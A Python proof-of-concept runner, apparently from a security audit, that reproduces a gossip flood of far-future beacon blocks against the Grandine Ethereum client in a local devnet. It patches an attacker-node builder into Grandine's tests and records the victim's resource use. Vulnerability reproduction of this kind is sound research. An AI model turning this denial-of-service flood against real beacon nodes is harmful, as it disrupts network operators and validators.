"""Grandine PROP-val-eth-003 live libp2p attack runner.

This is the Python side of the E2E repro:

1. discover the grandine CL container in a Kurtosis enclave,
2. resolve its externally reachable libp2p multiaddr,
3. extract the devnet chain config needed for a matching fork digest, and
4. run the Rust attack test in ``grandine/eth2_libp2p``.

The Rust test is kept in ``harness/probes/grandine_libp2p_attack.rs`` and can be
copied into ``grandine/eth2_libp2p/tests/``. The local clone in this workspace
already has that file, but this module does not rely on untracked state except
for the Grandine checkout itself.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
import urllib.request
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path

from ..devnet.docker import sample_container
from ..observer import ResourceSample, reduce_samples

class GrandineProbeUnavailable(RuntimeError):
    """Raised when the live Grandine libp2p repro cannot be started."""


@dataclass
class GrandineTarget:
    container_id: str
    beacon_api: str
    metrics_api: str
    multiaddr: str
    config_dir: Path


def _run(cmd: list[str], *, timeout: int = 30, check: bool = True, cwd: Path | None = None) -> subprocess.CompletedProcess:
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)
    if check and proc.returncode != 0:
        raise GrandineProbeUnavailable(
            f"{' '.join(cmd)} failed: {proc.stderr.strip()[:500] or proc.stdout.strip()[:500]}"
        )
    return proc


def _cargo_attack_cmd() -> list[str]:
    return [
        "cargo", "test", "-p", "eth2_libp2p", "--features", "blst",
        "--test", "eth2_libp2p_tests", "flood_far_future_beacon_blocks",
        "--", "--ignored", "--nocapture",
    ]


def _attack_env(
    target: GrandineTarget,
    *,
    count: int | None,
    slot_offset: int,
    warmup: int,
    batch: int | None = None,
    batch_sleep_ms: int | None = None,
) -> dict[str, str]:
    env = {
        "GR_CFG": str(target.config_dir),
        "GR_TARGET": target.multiaddr,
        "GR_SLOT_OFFSET": str(slot_offset),
        "GR_WARMUP": str(warmup),
    }
    if count is not None:
        env["GR_FLOOD"] = str(count)
    if batch is not None:
        env["GR_BATCH"] = str(batch)
    if batch_sleep_ms is not None:
        env["GR_BATCH_SLEEP_MS"] = str(batch_sleep_ms)
    return env


def _container(enclave: str) -> str:
    ids = _run(
        ["docker", "ps", "-q", "--filter", f"label=com.kurtosistech.enclave-name={enclave}"]
    ).stdout.split()
    for cid in ids:
        label = _run(
            [
                "docker", "inspect", cid, "--format",
                '{{index .Config.Labels "com.kurtosistech.id"}}',
            ]
        ).stdout.strip()
        if label.startswith("cl-") and "grandine" in label:
            return cid
    raise GrandineProbeUnavailable(f"no grandine CL container in enclave {enclave!r}")


def _host_port(cid: str, container_port: str) -> int | None:
    out = _run(["docker", "port", cid, container_port], check=False).stdout
    for line in out.splitlines():
        m = re.search(r":(\d+)$", line.strip())
        if m:
            return int(m.group(1))
    return None


def _json(url: str) -> dict:
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def _peer_id(identity: dict) -> str:
    data = identity.get("data", identity)
    peer_id = data.get("peer_id")
    if isinstance(peer_id, str) and peer_id:
        return peer_id
    for addr in data.get("p2p_addresses", []):
        if "/p2p/" in addr:
            return addr.rsplit("/p2p/", 1)[1]
    raise GrandineProbeUnavailable("beacon identity did not expose peer_id")


def _copy_first_existing(cid: str, candidates: list[str], dest: Path) -> bool:
    for src in candidates:
        probe = _run(["docker", "exec", cid, "test", "-e", src], check=False)
        if probe.returncode == 0:
            _run(["docker", "cp", f"{cid}:{src}", str(dest)])
            return True
    return False


def _extract_config(cid: str, beacon_api: str, dest: Path) -> Path:
    dest.mkdir(parents=True, exist_ok=True)
    config_dest = dest / "config.yaml"
    copied = _copy_first_existing(
        cid,
        [
            "/network-configs/config.yaml",
            "/network-config/config.yaml",
            "/data/network-configs/config.yaml",
            "/data/testnet_config/config.yaml",
            "/testnet_config/config.yaml",
            "/config/config.yaml",
        ],
        config_dest,
    )
    if not copied:
        raise GrandineProbeUnavailable(
            "could not find config.yaml in grandine container; set GR_CFG manually"
        )

    genesis = _json(beacon_api.rstrip("/") + "/eth/v1/beacon/genesis")
    root = genesis["data"]["genesis_validators_root"]
    (dest / "genesis_validators_root.txt").write_text(root + "\n", encoding="utf-8")
    return dest


def discover_grandine_target(enclave: str = "repro-grandine") -> GrandineTarget:
    cid = _container(enclave)
    beacon_port = _host_port(cid, "4000") or _host_port(cid, "5052")
    metrics_port = _host_port(cid, "8008")
    p2p_port = _host_port(cid, "9000")
    if beacon_port is None:
        raise GrandineProbeUnavailable("grandine beacon API port is not published")
    if p2p_port is None:
        raise GrandineProbeUnavailable("grandine libp2p TCP port 9000 is not published")

    beacon_api = f"http://127.0.0.1:{beacon_port}"
    peer = _peer_id(_json(beacon_api + "/eth/v1/node/identity"))
    cfg = Path(tempfile.mkdtemp(prefix="grandine-netcfg-"))
    _extract_config(cid, beacon_api, cfg)
    return GrandineTarget(
        container_id=cid,
        beacon_api=beacon_api,
        metrics_api=f"http://127.0.0.1:{metrics_port}" if metrics_port else "",
        multiaddr=f"/ip4/127.0.0.1/tcp/{p2p_port}/p2p/{peer}",
        config_dir=cfg,
    )


def ensure_rust_test_installed(grandine_dir: Path) -> Path:
    src = Path(__file__).with_suffix(".rs")
    dst = grandine_dir / "eth2_libp2p" / "tests" / "grandine_gossip_attack.rs"
    main = grandine_dir / "eth2_libp2p" / "tests" / "main.rs"
    common = grandine_dir / "eth2_libp2p" / "tests" / "common.rs"
    if not src.exists():
        raise GrandineProbeUnavailable(f"missing Rust attack source: {src}")
    if not dst.exists() or dst.read_text(encoding="utf-8") != src.read_text(encoding="utf-8"):
        shutil.copyfile(src, dst)
    _ensure_common_helper(common)
    text = main.read_text(encoding="utf-8")
    if "mod grandine_gossip_attack;" not in text:
        main.write_text(text.rstrip() + "\nmod grandine_gossip_attack;\n", encoding="utf-8")
    return dst


def _ensure_common_helper(common: Path) -> None:
    text = common.read_text(encoding="utf-8")
    changed = False
    extra_imports = []
    if "EnrForkId" not in text:
        extra_imports.append("use eth2_libp2p::types::EnrForkId;")
    if "ForkContext" not in text:
        extra_imports.append("use eth2_libp2p::types::ForkContext;")
    if extra_imports:
        text = "\n".join(extra_imports) + "\n" + text
        changed = True
    if "pub async fn build_attacker_instance" not in text:
        text = text.rstrip() + r'''

// Attacker-node builder for the PROP-val-eth-003 live PoC. It is the regular
// libp2p test node with a ForkContext and EnrForkId derived from the live
// devnet config + genesis_validators_root, so beacon_block topics match the
// victim's real fork digest.
#[allow(dead_code)]
pub async fn build_attacker_instance<P: Preset>(
    chain_config: &Arc<ChainConfig>,
    genesis_validators_root: types::phase0::primitives::H256,
) -> Libp2pInstance<P> {
    let config = build_config(vec![], true, None);
    let (shutdown_tx, _) = futures::channel::mpsc::channel(1);
    let executor = TaskExecutor::new(shutdown_tx);
    let custody_group_count = chain_config.custody_requirement;
    let current_slot = 1000;
    let fork_context = Arc::new(ForkContext::new::<P>(
        chain_config,
        current_slot,
        genesis_validators_root,
    ));
    let enr_fork_id = EnrForkId {
        fork_digest: fork_context.current_fork_digest(),
        ..EnrForkId::default()
    };
    let libp2p_context = Context {
        chain_config: chain_config.clone_arc(),
        config,
        enr_fork_id,
        fork_context,
        libp2p_registry: None,
    };
    Libp2pInstance(
        LibP2PService::new(
            chain_config.clone(),
            executor,
            libp2p_context,
            custody_group_count,
            secp256k1::Keypair::generate().into(),
        )
        .await
        .expect("should build attacker instance")
        .0,
    )
}
''' + "\n"
        changed = True
    if changed:
        common.write_text(text, encoding="utf-8")


def run_grandine_libp2p_attack(
    *,
    enclave: str = "repro-grandine",
    grandine_dir: str | Path = "grandine",
    count: int | None = 100_000,
    slot_offset: int = 1_000_000,
    warmup: int = 12,
    batch: int | None = None,
    batch_sleep_ms: int | None = None,
    timeout: int = 1800,
) -> GrandineTarget:
    target = discover_grandine_target(enclave)
    grandine_path = Path(grandine_dir)
    ensure_rust_test_installed(grandine_path)
    run_env = {
        **dict(os.environ),
        **_attack_env(
            target,
            count=count,
            slot_offset=slot_offset,
            warmup=warmup,
            batch=batch,
            batch_sleep_ms=batch_sleep_ms,
        ),
    }
    run_env.setdefault("LIBCLANG_PATH", _find_libclang_path())
    proc = subprocess.run(
        _cargo_attack_cmd(),
        cwd=grandine_path,
        env=run_env,
        text=True,
        timeout=timeout,
    )
    if proc.returncode != 0:
        raise GrandineProbeUnavailable(f"grandine libp2p attack failed with exit {proc.returncode}")
    return target


def _find_libclang_path() -> str:
    for root in ("/nix/store", "/usr/lib", "/usr/lib64", "/usr/local/lib"):
        root_path = Path(root)
        if not root_path.exists():
            continue
        try:
            found = next(root_path.rglob("libclang.so*"))
        except (StopIteration, PermissionError):
            continue
        return str(found.parent)
    return ""


def _sample_once(container_id: str) -> ResourceSample:
    return sample_container(container_id, samples=1, interval=0)[0]


def _write_samples_csv(path: Path, samples: list[ResourceSample]) -> None:
    lines = ["t_seconds,rss_mb,cpu_pct"]
    lines.extend(f"{s.t_seconds:.3f},{s.rss_mb:.3f},{s.cpu_pct:.3f}" for s in samples)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


_METRIC_NAMES = {
    "RECEIVED_OBJECTS_OVER_GOSSIP",
    "gossipsub_topic_msg_recv_counts_total",
    "gossipsub_topic_msg_recv_counts_unfiltered_total",
    "gossipsub_topic_msg_published_total",
    "gossipsub_topic_msg_sent_counts_total",
    "gossipsub_topic_iwant_msgs_total",
}


def _scrape_beacon_block_metrics(metrics_api: str) -> dict[str, float]:
    if not metrics_api:
        return {}
    try:
        text = urllib.request.urlopen(metrics_api.rstrip("/") + "/metrics", timeout=5).read().decode()
    except Exception:
        return {}
    out: dict[str, float] = {}
    for line in text.splitlines():
        if not line or line.startswith("#") or "beacon_block" not in line:
            continue
        name = line.split("{", 1)[0].split(" ", 1)[0]
        if name not in _METRIC_NAMES:
            continue
        try:
            value = float(line.rsplit(" ", 1)[1])
        except ValueError:
            continue
        out[line.rsplit(" ", 1)[0]] = value
    for line in text.splitlines():
        if line.startswith('RECEIVED_OBJECTS_OVER_GOSSIP{type="beacon_block"}'):
            try:
                out['RECEIVED_OBJECTS_OVER_GOSSIP{type="beacon_block"}'] = float(
                    line.rsplit(" ", 1)[1]
                )
            except ValueError:
                pass
    return out


def _metric_delta(before: dict[str, float], after: dict[str, float]) -> dict[str, float]:
    keys = set(before) | set(after)
    return {k: after.get(k, 0.0) - before.get(k, 0.0) for k in sorted(keys)}


def run_measured_grandine_libp2p_attack(
    *,
    enclave: str = "repro-grandine",
    grandine_dir: str | Path = "grandine",
    count: int = 100_000,
    slot_offset: int = 1_000_000,
    warmup: int = 12,
    batch: int | None = None,
    batch_sleep_ms: int | None = None,
    sample_interval: float = 1.0,
    timeout: int = 1800,
    out_dir: str | Path | None = None,
) -> Path:
    """Run the libp2p attack while sampling victim RSS/CPU.

    Returns the directory containing:
      - ``samples.csv``
      - ``metrics.json``
      - ``attack.log``
    """
    target = discover_grandine_target(enclave)
    grandine_path = Path(grandine_dir)
    ensure_rust_test_installed(grandine_path)

    if out_dir is None:
        stamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
        out_dir = Path("reports/grandine/poc/PROP-val-eth-003/runs") / stamp
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)

    run_env = {
        **dict(os.environ),
        **_attack_env(
            target,
            count=count,
            slot_offset=slot_offset,
            warmup=warmup,
            batch=batch,
            batch_sleep_ms=batch_sleep_ms,
        ),
    }
    run_env.setdefault("LIBCLANG_PATH", _find_libclang_path())

    samples: list[ResourceSample] = []
    start = datetime.now(UTC)
    metrics_before = _scrape_beacon_block_metrics(target.metrics_api)
    log_path = out / "attack.log"
    with log_path.open("w", encoding="utf-8") as log:
        proc = subprocess.Popen(
            _cargo_attack_cmd(),
            cwd=grandine_path,
            env=run_env,
            stdout=log,
            stderr=subprocess.STDOUT,
            text=True,
        )
        deadline = datetime.now(UTC).timestamp() + timeout
        try:
            while proc.poll() is None:
                now = datetime.now(UTC).timestamp()
                if now > deadline:
                    proc.kill()
                    raise GrandineProbeUnavailable(f"grandine libp2p attack timed out after {timeout}s")
                sample = _sample_once(target.container_id)
                sample.t_seconds = (datetime.now(UTC) - start).total_seconds()
                samples.append(sample)
                __import__("time").sleep(sample_interval)
        finally:
            if proc.poll() is None:
                proc.kill()

    # Take a final sample after the Rust test exits/drains.
    final = _sample_once(target.container_id)
    final.t_seconds = (datetime.now(UTC) - start).total_seconds()
    samples.append(final)

    metrics = reduce_samples(samples, reachable=True)
    metrics_after = _scrape_beacon_block_metrics(target.metrics_api)
    data = {
        "started_at": start.isoformat(),
        "enclave": enclave,
        "container_id": target.container_id,
        "beacon_api": target.beacon_api,
        "metrics_api": target.metrics_api,
        "multiaddr": target.multiaddr,
        "count": count,
        "slot_offset": slot_offset,
        "warmup": warmup,
        "batch": batch,
        "batch_sleep_ms": batch_sleep_ms,
        "sample_interval": sample_interval,
        "returncode": proc.returncode,
        "metrics": {
            "rss_delta_mb": metrics.rss_delta_mb,
            "peak_rss_mb": metrics.peak_rss_mb,
            "cpu_pct": metrics.cpu_pct,
            "reachable": metrics.reachable,
        },
        "beacon_block_metrics_before": metrics_before,
        "beacon_block_metrics_after": metrics_after,
        "beacon_block_metrics_delta": _metric_delta(metrics_before, metrics_after),
    }
    (out / "metrics.json").write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
    _write_samples_csv(out / "samples.csv", samples)
    if proc.returncode != 0:
        raise GrandineProbeUnavailable(f"grandine libp2p attack failed with exit {proc.returncode}; see {log_path}")
    return out


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Run grandine PROP-val-eth-003 libp2p repro")
    parser.add_argument("--enclave", default="repro-grandine")
    parser.add_argument("--grandine-dir", default="grandine")
    parser.add_argument("--count", type=int, default=100_000)
    parser.add_argument("--slot-offset", type=int, default=1_000_000)
    parser.add_argument("--warmup", type=int, default=12)
    parser.add_argument("--batch", type=int)
    parser.add_argument("--batch-sleep-ms", type=int)
    parser.add_argument("--timeout", type=int, default=1800)
    parser.add_argument("--sample-interval", type=float, default=1.0)
    parser.add_argument("--out-dir")
    parser.add_argument("--no-measure", action="store_true")
    args = parser.parse_args()

    if args.no_measure:
        t = run_grandine_libp2p_attack(
            enclave=args.enclave,
            grandine_dir=args.grandine_dir,
            count=args.count,
            slot_offset=args.slot_offset,
            warmup=args.warmup,
            batch=args.batch,
            batch_sleep_ms=args.batch_sleep_ms,
            timeout=args.timeout,
        )
        print(f"grandine={t.multiaddr} beacon_api={t.beacon_api} metrics={t.metrics_api} cfg={t.config_dir}")
    else:
        out = run_measured_grandine_libp2p_attack(
            enclave=args.enclave,
            grandine_dir=args.grandine_dir,
            count=args.count,
            slot_offset=args.slot_offset,
            warmup=args.warmup,
            batch=args.batch,
            batch_sleep_ms=args.batch_sleep_ms,
            timeout=args.timeout,
            sample_interval=args.sample_interval,
            out_dir=args.out_dir,
        )
        print(out)
